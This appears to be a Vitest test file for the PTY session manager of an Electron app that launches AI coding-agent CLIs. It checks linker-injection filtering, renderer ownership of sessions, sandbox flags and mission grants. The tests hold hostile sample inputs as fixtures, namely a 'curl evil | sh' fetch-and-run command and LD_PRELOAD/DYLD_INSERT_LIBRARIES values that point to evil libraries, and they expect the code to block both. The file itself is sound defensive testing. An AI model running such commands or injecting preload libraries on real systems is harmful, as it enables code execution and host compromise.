import fs from "node:fs";
import { describe, expect, it, vi } from "vitest";
import type { WebContents } from "electron";
import {
  agentEnv,
  acknowledgeSessionOutput,
  bindOwnedAgentSessionMission,
  configureAgentHookEndpointPath,
  consumeMissionOrchestratorGrant,
  getOwnedAgentSessionInfo,
  getSessionState,
  killSession,
  recoverSessionOutput,
  setPtyHost,
  setSessionDictationHook,
  spawnAgentSession,
  spawnSession,
  publishSessionActivityState,
  writeSession,
} from "./pty-manager";
import type {
  PtyHost,
  PtyProcHandle,
  PtySessionHandlers,
  PtySpawnSpec,
} from "./pty-host-core";
import type { CliPtyAdapter } from "../../shared/adapter-types";
import type { BoundSpawnAuthority } from "../orch/spawn-authority";

function trustedSpawn(
  cwd = fs.realpathSync(process.cwd()),
): BoundSpawnAuthority {
  return {
    source: "direct-user",
    context: null,
    cwd,
    scope: {
      version: 1,
      installationId: "installation-test",
      projectId: "project-test",
      checkoutId: "checkout-test",
      rootRealPath: cwd,
      identitySource: "provisional",
    },
  };
}

function missionGrant(
  cwd = fs.realpathSync(process.cwd()),
): BoundSpawnAuthority {
  const base = trustedSpawn(cwd);
  return {
    ...base,
    source: "legacy-squad",
    context: {
      squadId: "review-squad",
      agentName: "Maestro",
      role: "orchestrator",
      allowedTools: ["nexus_pane_spawn"],
      allowedSkills: ["review"],
    },
  };
}

function revisionBoundWorker(
  cwd = fs.realpathSync(process.cwd()),
): BoundSpawnAuthority {
  const base = trustedSpawn(cwd);
  return {
    ...base,
    source: "pending",
    coordinationScope: base.scope,
    context: {
      missionId: "mission-worker",
      contextRevision: "context-revision-worker",
      role: "worker",
      allowedTools: [],
      allowedSkills: null,
      scope: base.scope,
      executionScope: base.scope,
    },
  };
}

// A minimal, valid cli-pty adapter shaped just enough for agentEnv(). Only the
// `env` block matters here; the rest satisfies the type.
function makeAdapter(
  env: CliPtyAdapter["env"],
  spawnPatch: Partial<CliPtyAdapter["spawn"]> = {},
): CliPtyAdapter {
  return {
    kind: "cli-pty",
    id: "test-cli",
    label: "Test CLI",
    version: "1.0.0",
    icon: "🤖",
    bin: "test-cli",
    detect: "test-cli --version",
    install: { method: "npm", command: "npm install -g test-cli" },
    auth: { method: "none" },
    spawn: {
      interactive: ["test-cli"],
      headless: ["test-cli", "--prompt", "{{PROMPT}}"],
      ptyRequired: true,
      resumeArgs: [],
      extraArgs: [],
      ...spawnPatch,
    },
    env,
    models: { flag: "--model", list: ["default"], default: "default" },
    promptInjection: {
      method: "arg",
      trailingNewline: true,
      bracketedPaste: false,
    },
    stateParsing: {
      idle: { type: "timeout", ms: 500 },
      shellIntegration: false,
      exitCodes: {},
    },
    quirks: {
      altScreen: false,
      requiresNoAutoUpdate: false,
      mcpAutoload: false,
      nexusMcp: "none",
    },
    control: {
      permission: {
        safe: ["--sandbox", "read-only"],
        yolo: [],
        modes: {},
        default: "",
      },
    },
  } as CliPtyAdapter;
}

describe("agentEnv linker-injection guard (plugin trust boundary)", () => {
  it("drops DYLD_ keys from env.static", () => {
    const env = agentEnv(
      makeAdapter({
        static: { DYLD_INSERT_LIBRARIES: "/tmp/evil.dylib", SAFE_VAR: "ok" },
        passthrough: [],
        ephemeralHome: false,
      }),
    );
    expect(env.DYLD_INSERT_LIBRARIES).toBeUndefined();
    expect(env.SAFE_VAR).toBe("ok");
  });

  it("drops LD_ keys from env.static", () => {
    const env = agentEnv(
      makeAdapter({
        static: { LD_PRELOAD: "/tmp/evil.so", LD_LIBRARY_PATH: "/tmp" },
        passthrough: [],
        ephemeralHome: false,
      }),
    );
    expect(env.LD_PRELOAD).toBeUndefined();
    expect(env.LD_LIBRARY_PATH).toBeUndefined();
  });

  it("drops DYLD_/LD_ keys from env.passthrough even if present in process.env", () => {
    process.env.DYLD_TEST_INJECT = "x";
    process.env.LD_TEST_INJECT = "y";
    try {
      const env = agentEnv(
        makeAdapter({
          static: {},
          passthrough: ["DYLD_TEST_INJECT", "LD_TEST_INJECT"],
          ephemeralHome: false,
        }),
      );
      expect(env.DYLD_TEST_INJECT).toBeUndefined();
      expect(env.LD_TEST_INJECT).toBeUndefined();
    } finally {
      delete process.env.DYLD_TEST_INJECT;
      delete process.env.LD_TEST_INJECT;
    }
  });

  it("keeps ordinary static and passthrough vars", () => {
    process.env.NEXUS_TEST_TOKEN = "secret";
    try {
      const env = agentEnv(
        makeAdapter({
          static: { FOO: "bar" },
          passthrough: ["NEXUS_TEST_TOKEN"],
          ephemeralHome: false,
        }),
      );
      expect(env.FOO).toBe("bar");
      expect(env.NEXUS_TEST_TOKEN).toBe("secret");
    } finally {
      delete process.env.NEXUS_TEST_TOKEN;
    }
  });
});

// A WebContents stub that always accepts sends (canSend passes).
function fakeWc(): WebContents {
  return {
    isDestroyed: () => false,
    isCrashed: () => false,
    send: () => {},
  } as unknown as WebContents;
}

// Records the per-session proxy so a test can see which control calls fired.
function fakeHost(): {
  host: PtyHost;
  procFor: (id: string) => PtyProcHandle;
  specFor: (id: string) => PtySpawnSpec;
} {
  const procs = new Map<string, PtyProcHandle>();
  const specs = new Map<string, PtySpawnSpec>();
  return {
    host: {
      spawn(spec) {
        const proc: PtyProcHandle = {
          write: vi.fn(),
          resize: vi.fn(),
          kill: vi.fn(),
        };
        specs.set(spec.sessionId, spec);
        procs.set(spec.sessionId, proc);
        return proc;
      },
    },
    procFor: (id) => procs.get(id)!,
    specFor: (id) => specs.get(id)!,
  };
}

describe("PTY session ownership (renderer capability boundary)", () => {
  it('sequences output and recovers missed push chunks through the owner-only pull lane', () => {
    let handlers: PtySessionHandlers | null = null;
    const proc: PtyProcHandle = { write: vi.fn(), resize: vi.fn(), kill: vi.fn() };
    setPtyHost({
      spawn(_spec, nextHandlers) {
        handlers = nextHandlers;
        return proc;
      },
    });
    const send = vi.fn();
    const owner = {
      isDestroyed: () => false,
      isCrashed: () => false,
      send,
    } as unknown as WebContents;
    const attacker = fakeWc();
    const trusted = trustedSpawn();
    const { sessionId } = spawnSession(
      owner,
      { kind: 'shell', cols: 80, rows: 24 },
      { scope: trusted.scope, cwd: trusted.cwd, shell: '/bin/zsh' },
    );

    (handlers as PtySessionHandlers | null)?.onData('one');
    (handlers as PtySessionHandlers | null)?.onData('two');
    expect(send).toHaveBeenNthCalledWith(1, 'pty:data', {
      sessionId,
      data: 'one',
      sequence: 1,
    });
    expect(recoverSessionOutput(owner, sessionId, 0)).toHaveLength(2);
    acknowledgeSessionOutput(owner, sessionId, 1);
    expect(recoverSessionOutput(owner, sessionId, 1)).toEqual([
      { sessionId, data: 'two', sequence: 2 },
    ]);
    expect(recoverSessionOutput(attacker, sessionId, 0)).toEqual([]);
    killSession(owner, sessionId);
  });

  it("only the owning WebContents can write to / kill a session", () => {
    const h = fakeHost();
    setPtyHost(h.host);
    const owner = fakeWc();
    const attacker = fakeWc();

    const trusted = trustedSpawn();
    const { sessionId } = spawnSession(
      owner,
      { kind: "shell", cols: 80, rows: 24 },
      { scope: trusted.scope, cwd: trusted.cwd, shell: "/bin/zsh" },
    );
    const proc = h.procFor(sessionId);

    // A different renderer (or a session id it guessed) is refused: no bytes reach the PTY.
    writeSession(attacker, sessionId, "curl evil | sh\n");
    expect(proc.write).not.toHaveBeenCalled();

    // The owner writes normally.
    writeSession(owner, sessionId, "ls\n");
    expect(proc.write).toHaveBeenCalledWith("ls\n");

    // A foreign kill is a no-op; the session stays live.
    killSession(attacker, sessionId);
    expect(proc.kill).not.toHaveBeenCalled();
    expect(getSessionState(sessionId)).not.toBeNull();

    // The owner kills it.
    killSession(owner, sessionId);
    expect(proc.kill).toHaveBeenCalledTimes(1);
    expect(getSessionState(sessionId)).toBeNull();
  });
});

describe("cli-agent spawn argv hardening", () => {
  it("injects the managed hook endpoint and the main-owned PTY session key", () => {
    const h = fakeHost();
    setPtyHost(h.host);
    configureAgentHookEndpointPath("/tmp/nexus-hooks/endpoint.env");
    const owner = fakeWc();
    try {
      const { sessionId } = spawnAgentSession(
        owner,
        { kind: "cli-agent", cols: 80, rows: 24 },
        makeAdapter({ static: {}, passthrough: [], ephemeralHome: false }),
        {},
        trustedSpawn(),
      );
      expect(h.specFor(sessionId).env.NEXUS_AGENT_HOOK_ENDPOINT).toBe(
        "/tmp/nexus-hooks/endpoint.env",
      );
      expect(h.specFor(sessionId).env.NEXUS_PANE_KEY).toBe(sessionId);
      killSession(owner, sessionId);
    } finally {
      configureAgentHookEndpointPath(null);
    }
  });

  it("lets direct panes follow writable provider policy and keeps workers writable", () => {
    const h = fakeHost();
    setPtyHost(h.host);
    const base = makeAdapter({
      static: {},
      passthrough: [],
      ephemeralHome: false,
    });
    const codex: CliPtyAdapter = {
      ...base,
      id: "codex",
      control: {
        permission: {
          safe: ["--sandbox", "workspace-write", "--ask-for-approval", "on-request"],
          yolo: ["--dangerously-bypass-approvals-and-sandbox"],
          modes: {},
          default: "",
        },
      },
    };

    const direct = spawnAgentSession(
      fakeWc(),
      { kind: "cli-agent", cols: 80, rows: 24 },
      codex,
      {},
      trustedSpawn(),
    );
    const worker = spawnAgentSession(
      fakeWc(),
      { kind: "cli-agent", cols: 80, rows: 24 },
      codex,
      {},
      revisionBoundWorker(),
    );

    expect(h.specFor(direct.sessionId).args).toEqual(expect.arrayContaining([
      "--sandbox",
      "workspace-write",
      "--ask-for-approval",
      "on-request",
    ]));
    expect(h.specFor(worker.sessionId).args).toEqual(expect.arrayContaining([
      "--sandbox",
      "workspace-write",
    ]));
    expect(h.specFor(worker.sessionId).args).not.toContain("read-only");
  });

  it("keeps the configured Codex bypass on a read-only squad reviewer", () => {
    const h = fakeHost();
    setPtyHost(h.host);
    const base = makeAdapter({
      static: {},
      passthrough: [],
      ephemeralHome: false,
    });
    const codex: CliPtyAdapter = {
      ...base,
      id: "codex",
      control: {
        permission: {
          safe: ["--sandbox", "workspace-write", "--ask-for-approval", "on-request"],
          yolo: ["--dangerously-bypass-approvals-and-sandbox"],
          modes: { auto: "never" },
          default: "",
        },
      },
    };
    const worker = revisionBoundWorker();
    const reviewer: BoundSpawnAuthority = {
      ...worker,
      context: {
        ...worker.context!,
        readOnly: true,
      },
    };

    const spawned = spawnAgentSession(
      fakeWc(),
      { kind: "cli-agent", cols: 80, rows: 24 },
      codex,
      { extraArgs: ["--dangerously-bypass-approvals-and-sandbox"] },
      reviewer,
    );

    expect(h.specFor(spawned.sessionId).args).toContain(
      "--dangerously-bypass-approvals-and-sandbox",
    );
    expect(h.specFor(spawned.sessionId).args).not.toContain("on-request");
    expect(h.specFor(spawned.sessionId).args).not.toContain("read-only");
  });

  it("reports every scoped agent session even when the provider chooses its id", () => {
    const h = fakeHost();
    setPtyHost(h.host);
    const hook = vi.fn();
    setSessionDictationHook(hook);
    const owner = fakeWc();
    const authority = trustedSpawn();
    const { sessionId } = spawnAgentSession(
      owner,
      { kind: "cli-agent", cols: 80, rows: 24, paneId: "pane-a" },
      makeAdapter({ static: {}, passthrough: [], ephemeralHome: false }),
      {},
      authority,
    );
    expect(hook).toHaveBeenCalledWith({
      providerSessionId: null,
      ptySessionId: sessionId,
      adapterId: "test-cli",
      cwd: authority.cwd,
      paneId: "pane-a",
    });
    setSessionDictationHook(null);
    killSession(owner, sessionId);
  });

  it("appends adapter-declared extra args after user overrides", () => {
    const h = fakeHost();
    setPtyHost(h.host);

    const adapter = makeAdapter(
      { static: {}, passthrough: [], ephemeralHome: false },
      { extraArgs: ["--disallowedTools", "Task"] },
    );

    const { sessionId } = spawnAgentSession(
      fakeWc(),
      { kind: "cli-agent", cols: 80, rows: 24 },
      adapter,
      { extraArgs: ["--user-flag"] },
      trustedSpawn(),
    );

    const spec = h.specFor(sessionId);
    expect(spec.args).toContain("--user-flag");
    expect(spec.args).toEqual(expect.arrayContaining([
      "--disallowedTools",
      "Task",
      "--sandbox",
      "read-only",
    ]));
  });

  it("lets Kimi transient-model env choose the API model without an overriding --model", () => {
    const h = fakeHost();
    setPtyHost(h.host);
    const base = makeAdapter({
      static: {},
      passthrough: [],
      ephemeralHome: false,
    });
    const adapter: CliPtyAdapter = {
      ...base,
      id: "kimi",
      bin: "kimi",
      spawn: { ...base.spawn, interactive: ["kimi"] },
      models: {
        flag: "--model",
        list: ["kimi-code/kimi-for-coding"],
        default: "kimi-code/kimi-for-coding",
      },
    };

    const { sessionId } = spawnAgentSession(
      fakeWc(),
      {
        kind: "cli-agent",
        adapterId: "kimi",
        model: "kimi-code/kimi-for-coding",
        cols: 80,
        rows: 24,
      },
      adapter,
      {
        keyEnv: {
          KIMI_MODEL_API_KEY: "sk-kimi-test",
          KIMI_MODEL_NAME: "kimi-for-coding",
        },
      },
      trustedSpawn(),
    );

    const spec = h.specFor(sessionId);
    expect(spec.args).not.toContain("--model");
    expect(spec.env.KIMI_MODEL_API_KEY).toBe("sk-kimi-test");
    expect(spec.env.KIMI_MODEL_NAME).toBe("kimi-for-coding");
  });

  it("normalizes the legacy Kimi OAuth model alias before adding --model", () => {
    const h = fakeHost();
    setPtyHost(h.host);
    const base = makeAdapter({
      static: {},
      passthrough: [],
      ephemeralHome: false,
    });
    const adapter: CliPtyAdapter = {
      ...base,
      id: "kimi",
      bin: "kimi",
      spawn: { ...base.spawn, interactive: ["kimi"] },
      models: {
        flag: "--model",
        list: ["kimi-code/kimi-for-coding"],
        default: "kimi-code/kimi-for-coding",
      },
    };

    const { sessionId } = spawnAgentSession(
      fakeWc(),
      {
        kind: "cli-agent",
        adapterId: "kimi",
        model: "kimi-for-coding",
        cols: 80,
        rows: 24,
      },
      adapter,
      {},
      trustedSpawn(),
    );

    expect(h.specFor(sessionId).args).toEqual([
      "--model",
      "kimi-code/kimi-for-coding",
      "--sandbox",
      "read-only",
    ]);
  });

  it("passes only provider-qualified OpenCode model ids", () => {
    const h = fakeHost();
    setPtyHost(h.host);
    const base = makeAdapter({
      static: {},
      passthrough: [],
      ephemeralHome: false,
    });
    const adapter: CliPtyAdapter = {
      ...base,
      id: "opencode",
      bin: "opencode",
      spawn: { ...base.spawn, interactive: ["opencode"] },
      models: {
        flag: "--model",
        list: ["opencode/big-pickle"],
        default: "opencode/big-pickle",
      },
    };

    const valid = spawnAgentSession(
      fakeWc(),
      {
        kind: "cli-agent",
        adapterId: "opencode",
        model: "opencode/big-pickle",
        cols: 80,
        rows: 24,
      },
      adapter,
      {},
      trustedSpawn(),
    );
    const stale = spawnAgentSession(
      fakeWc(),
      {
        kind: "cli-agent",
        adapterId: "opencode",
        model: "claude-sonnet-5",
        cols: 80,
        rows: 24,
      },
      adapter,
      {},
      trustedSpawn(),
    );

    expect(h.specFor(valid.sessionId).args).toEqual([
      "--model",
      "opencode/big-pickle",
      "--sandbox",
      "read-only",
    ]);
    expect(h.specFor(stale.sessionId).args).toEqual([
      "--sandbox",
      "read-only",
    ]);
  });

  it("requires a trusted main-side binding and never falls back to HOME", () => {
    const h = fakeHost();
    setPtyHost(h.host);
    const adapter = makeAdapter({
      static: {},
      passthrough: [],
      ephemeralHome: false,
    });

    expect(() =>
      spawnAgentSession(
        fakeWc(),
        { kind: "cli-agent", cols: 80, rows: 24 },
        adapter,
        {},
        undefined as never,
      ),
    ).toThrow(/trusted spawn authority/);
  });

  it("uses the canonical bound cwd even when the renderer request carries another cwd", () => {
    const h = fakeHost();
    setPtyHost(h.host);
    const adapter = makeAdapter({
      static: {},
      passthrough: [],
      ephemeralHome: false,
    });
    const trustedCwd = fs.realpathSync(process.cwd());

    const { sessionId } = spawnAgentSession(
      fakeWc(),
      {
        kind: "cli-agent",
        cwd: "/renderer-controlled/path",
        cols: 80,
        rows: 24,
      },
      adapter,
      {},
      trustedSpawn(trustedCwd),
    );

    expect(h.specFor(sessionId).cwd).toBe(trustedCwd);
  });

  it("owns agent metadata in main and consumes mission promotion exactly once", () => {
    const h = fakeHost();
    setPtyHost(h.host);
    const owner = fakeWc();
    const attacker = fakeWc();
    const cwd = fs.realpathSync(process.cwd());
    const baseAdapter = makeAdapter({
      static: {},
      passthrough: [],
      ephemeralHome: false,
    });
    const adapter: CliPtyAdapter = {
      ...baseAdapter,
      quirks: { ...baseAdapter.quirks, mcpAutoload: true },
    };

    const { sessionId } = spawnAgentSession(
      owner,
      {
        kind: "cli-agent",
        paneId: "pane-orchestrator",
        model: "default",
        accountId: "account-a",
        effort: "high",
        cols: 80,
        rows: 24,
      },
      adapter,
      {},
      missionGrant(cwd),
    );

    expect(getOwnedAgentSessionInfo(attacker, sessionId)).toBeNull();
    expect(getOwnedAgentSessionInfo(owner, sessionId)).toMatchObject({
      sessionId,
      paneId: "pane-orchestrator",
      adapterId: "test-cli",
      model: "default",
      accountId: "account-a",
      effort: "high",
      cwd,
      role: "orchestrator",
      squadId: "review-squad",
      source: "legacy-squad",
    });
    expect(
      consumeMissionOrchestratorGrant(attacker, sessionId, "review-squad"),
    ).toBeNull();
    expect(
      consumeMissionOrchestratorGrant(owner, sessionId, "other-squad"),
    ).toBeNull();
    expect(
      consumeMissionOrchestratorGrant(owner, sessionId, "review-squad"),
    ).toMatchObject({ sessionId, squadId: "review-squad" });
    expect(
      consumeMissionOrchestratorGrant(owner, sessionId, "review-squad"),
    ).toBeNull();
    expect(bindOwnedAgentSessionMission(owner, sessionId, "mission-a")).toBe(
      true,
    );
    expect(getOwnedAgentSessionInfo(owner, sessionId)?.missionId).toBe(
      "mission-a",
    );
    expect(bindOwnedAgentSessionMission(owner, sessionId, "mission-b")).toBe(
      false,
    );

    killSession(owner, sessionId);
  });

  it("keeps state as busy when hookState is busy, ignoring the idle timeout", async () => {
    vi.useFakeTimers();
    let handlers: PtySessionHandlers | null = null;
    const proc: PtyProcHandle = { write: vi.fn(), resize: vi.fn(), kill: vi.fn() };
    setPtyHost({
      spawn(_spec, nextHandlers) {
        handlers = nextHandlers;
        return proc;
      },
    });

    const owner = fakeWc();
    const trusted = trustedSpawn();
    const adapter = makeAdapter({
      static: {},
      passthrough: [],
      ephemeralHome: false,
    });

    const { sessionId } = spawnAgentSession(
      owner,
      {
        kind: "cli-agent",
        cols: 80,
        rows: 24,
      },
      adapter,
      {},
      trusted,
    );

    const activeHandlers = handlers as PtySessionHandlers | null;
    if (!activeHandlers) throw new Error("PTY handlers were not registered");

    // Initial state is spawning, transitions to busy on first data
    activeHandlers.onData("hello");
    expect(getSessionState(sessionId)).toBe("busy");

    // Publish hook state as busy
    publishSessionActivityState(sessionId, "busy");
    expect(getSessionState(sessionId)).toBe("busy");

    // Advance time by the idle timeout (adapter has 500ms)
    await vi.advanceTimersByTimeAsync(1000);

    // The state should still be busy, because hookState is busy!
    expect(getSessionState(sessionId)).toBe("busy");

    // Publish hook state as idle
    publishSessionActivityState(sessionId, "idle");
    expect(getSessionState(sessionId)).toBe("idle");

    killSession(owner, sessionId);
    vi.useRealTimers();
  });
});
